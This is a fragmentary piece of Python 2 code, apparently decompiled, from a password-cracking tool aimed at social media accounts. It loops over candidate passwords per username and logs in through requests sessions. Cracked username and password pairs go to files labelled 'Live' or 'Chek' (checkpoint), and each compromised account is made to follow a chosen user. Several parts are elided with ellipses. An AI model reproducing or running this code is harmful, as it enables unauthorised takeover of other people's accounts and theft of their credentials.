    ...
    while True:
        ...
        if pil == '1':
            ...
            try:
                ...
                JrKing_ok_ = open('result_ok.txt', 'r').readlines()

                print k + '\n >_' + p + ' Show Result ' + h + 'Live\n'

                for dev in JrKing_ok_:

                    ok = dev.replace('\n', '').split('==>')

                    print a + '  {' + k + 'Live' + a + '} ' + h + ok[1] + a + ' | ' + p + ok[3]

                print h + '\n >_< ' + p + 'Total' + k + ': ' + str(len(JrKing_ok_))
            ...
            try:
                ...
                JrKing_cp_ = open('result_cp.txt', 'r').readlines()

                print k + '\n >_' + p + ' Show Results ' + k + 'Checkpoint\n'

                for dev in JrKing_cp_:

                    cp = dev.replace('\n', '').split('==>')

                    print a + '  {' + p + 'Chek' + a + '} ' + k + cp[1] + a + ' | ' + d + cp[3]

                print h + '\n >_< ' + p + 'Total' + k + ': ' + str(len(JrKing_cp_))
...
def follow_dev(ses_dev, username_dev):
    ...
    if len(status_foll) != 1:
        ...
        print h + ('\r >>> Follow {}/{}|Chek+{}/Live+{}  ').format(str(count_foll), len(data_), len(JrKing_cp), len(JrKing_ok)),
    ...
    for pass_satu in pass_dev_:
        ...
        if c != 1:
            ...
            if len(status_foll) != 1:
                ...
                print h + ('\r >>>\x1b[97;1m Crack \x1b[96;1m{}\x1b[97;1m/\x1b[96;1m{}\x1b[97;1m/\x1b[96;1m{}\x1b[97;1m|\x1b[93;1mChek+{}\x1b[97;1m/\x1b[92;1mLive+{}  ').format(str(c_pw), str(count_), len(data_), len(JrKing_cp), len(JrKing_ok)),
            ...
            try:
                ...
                if username_dev in JrKing_ok or username_dev in JrKing_cp:
                ...
                with requests.Session() as (ses_dev):
                    ...
                    if 'checkpoint_url' in str(data_dev):
                        ...
                        with open('JrKing_cp.txt', 'a') as (dev_):

                            dev_.write('[Chek]==>' + username_dev + '==>|==>' + pass_dev + '\n')

                        JrKing_cp.append(username_dev)
                        ...
                        if len(status_foll) != 1:
                            ...
                            JrKing_ok.append(username_dev)

                            follow_dev(ses_dev, username_dev)

                        else:

                            JrKing_ok.append('dev_id')
